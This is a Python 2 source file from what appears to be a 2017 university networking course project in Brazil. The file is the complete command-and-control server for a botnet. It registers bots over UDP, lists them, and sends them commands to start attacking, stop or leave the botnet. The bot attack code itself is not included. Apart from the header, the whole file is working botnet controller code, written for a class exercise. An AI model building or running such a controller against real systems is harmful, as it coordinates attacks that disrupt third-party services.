# -*- coding: utf-8 -*-
#######################################################################################################
#    UnB - Universidade de Brasília     
#    Departamento de Ciência da Computação                                                               
#    Teleinformática e Redes 2 - 2017/1                                                               
#    Professor: Jacir Luiz Bordim 
#    Projeto Final
#    Integrantes:
#    ==============================================                                                                    
#     Edgar Fabiano de Souza Filho - 14/0019201
#     Ingrid Santana Lopes - 14/0083065
#     Marcos Paulo Cayres Rosa - 14/0027131
#     Paulo Victor Gonçalves Farias - 13/0144754
#     Rennê Ruan Alves Oliveira - 14/0030930                                                                     
#    ==============================================                                     
#        
#    Gerente.py = Responsável por comandar a BotNet, ou seja, controlar todos os bots que estão 
#    rodando os programas para realizar o ataque. O Gerente consegue fazer com que os bots ataquem
#    em um determinado momento e que parem quando ele quiser.  
#                                                                     
#######################################################################################################
import threading
import errno
from socket import *

serverPort = 12000
serverSocket = socket(AF_INET, SOCK_DGRAM)
serverSocket.bind(('', serverPort))

print 'O servidor ' + gethostname() + ' esta pronto'
print 'Para abrir o menu aperte ENTER'

bots = []

def ImprimeBots():
    for i in range(len(bots)):
        try:
            if bots[i][2] == True:
                #                      Nome                             IP                                      Porta
                print str(i) + ' - ' + bots[i][0] + "  |  IP: " + str(bots[i][1][0]) + "  |  Porta: " + str(bots[i][1][1]) + ' | Atacando'
            else:
                print str(i) + ' - ' + bots[i][0] + "  |  IP: " + str(bots[i][1][0]) + "  |  Porta: " + str(bots[i][1][1]) + ' | Aguardando'
        except error, e:
            print 'IP do bot nao encontrado\n'

def FindByName(name):
    for i in range(len(bots)):
        if name == bots[i][0]:
            break

    if i == len(bots) and name != bots[i][0]:
        return -1

    return i

def EnviaMensagem(index, msg):
    try:
        serverSocket.sendto(msg, bots[index][1])
        #atk - ataque | rem - remover da botnet | stp - parar ataque
        return 0
    except error, e:
        if e[0] == errno.ECONNREFUSED:
            print 'Conexao perdida com o bot ' + bots[index][0] + ' - Removendo-o da botnet'
        if e[0] == errno.ETIMEDOUT:
            print 'O bot ' + bots[index][0] + ' esta demorando muito para responder'
        return -1

def ThreadEnvio():
    while True:
        try:
            raw_input()
        except EOFError:
            for i in range(len(bots)):
                EnviaMensagem(i, 'rem')
            print 'Removento todos os bots'
            print 'Saindo...'
            del bots[:]
            exit(0)

        if len(bots) == 0:
            print 'Nao ha bots conectados\n'

        else:
            print 'O que deseja fazer?'
            print '1 - Ver lista de bots conectados'
            print '2 - Fazer todos os bots enviarem ataque'
            print '3 - Fazer um bot especifico enviar ataque'
            print '4 - Parar todos os ataques'
            print '5 - Remover um bot da botnet'
            print '6 - Remover todos os bots da botnet'
            op = input ('0 - Sair\n')
            
            if op == 1:
                print '\nbotnet:'
                ImprimeBots()
                
            elif op == 2:
                print '\nIniciando ataque em todos os bots'
                for i in range(len(bots)):
                    if bots[i][2] == True:
                        print 'Bot ' + bots[i][0]  + ' ja estava atacando'
                    else:
                        if EnviaMensagem(i, 'atk') == 0:
                            print 'Bot ' + bots[i][0]  + ' iniciou o ataque'
                            bots[i] = (bots[i][0], bots[i][1], True) #Atribui True ao estado "Atacando" do bot
                        else:
                            print 'Bot desconectado ' + bots[i][0] + ', removendo-o da botnet'
                            bots.remove(bots[i])
                            i = i - 1
                    
            elif op == 3:
                print '\nQual bot deseja que inicie o ataque:'
                ImprimeBots()
                i = input('')
                if bots[i][2] == True:
                    print 'Bot ' + bots[i][0]  + ' ja esta atacando'
                else:
                    if EnviaMensagem(i, 'atk') == 0:
                        print 'Bot ' + bots[i][0] + ' iniciou o ataque'
                        bots[i] = (bots[i][0], bots[i][1], True) #Atribui True ao estado "Atacando" do bot
                    else:
                       print 'Bot desconectado ' + bots[i][0] + ', removendo-o da botnet'
                       bots.pop(i)
                print '\n'

            elif op == 4:
                print '\nParando todos os ataques'
                for i in range(len(bots)):
                    if bots[i][2] == False:
                        print 'Bot ' + bots[i][0]  + ' nao estava atacando'
                    else:
                        if EnviaMensagem(i, 'stp') == 0:
                            print 'Bot ' + bots[i][0]  + ' parou o ataque'
                            bots[i] = (bots[i][0], bots[i][1], False) #Atribui False ao estado "Atacando" do bot
                        else:
                            print 'Bot desconectado ' + bots[i][0] + ', removendo-o da botnet'
                            bots.remove(bots[i])
                            i = i - 1

            elif op == 5:
                print '\nQual bot deseja remover da botnet:'
                ImprimeBots()
                i = input('')
                if bots[i][2] == True:
                    EnviaMensagem(i, 'stp')
                EnviaMensagem(i, 'rem')
                print 'Removendo bot: ' + bots[i][0]
                bots.remove(bots[i])
                print '\n'

            elif op == 6:
                for i in range(len(bots)):
                    if bots[i][2] == True:
                        EnviaMensagem(i, 'stp')
                    EnviaMensagem(i, 'rem')
                print '\nRemovento todos os bots'
                del bots[:]
                print '\n'

            elif op == 0:
                for i in range(len(bots)):
                    if bots[i][2] == True:
                        EnviaMensagem(i, 'stp')
                    EnviaMensagem(i, 'rem')
                print '\nRemovento todos os bots'
                print 'Saindo...'
                del bots[:]
                print '\n'
                exit(0)

try:              
    thread = threading.Thread(target = ThreadEnvio, args=())
    thread.daemon = True
    thread.start()

    while True:
        message, clientAddress = serverSocket.recvfrom(2048)
        #print message

        tipo = message[:3] #3 primeiros caracteres da string definem o tipo da mensagem
        #cli = novo cliente | off = cliente desconectado
        message = message[3:]


        if tipo == 'cli' :
            if (message in bots) == False:
                bots.append((message, clientAddress, False))
                print '\n' + message + ' conectado a botnet'
                serverSocket.sendto('acc', clientAddress)

        if tipo == 'off' :
            i = FindByName(message)
            if i  != -1:
                bots.pop(i)
                print '\n' + message +  ' desconectado da botnet'

except SystemExit:
    for i in range(len(bots)):
        EnviaMensagem(i, 'rem')
    print 'Removento todos os bots\n'
    del bots[:]
    exit(0)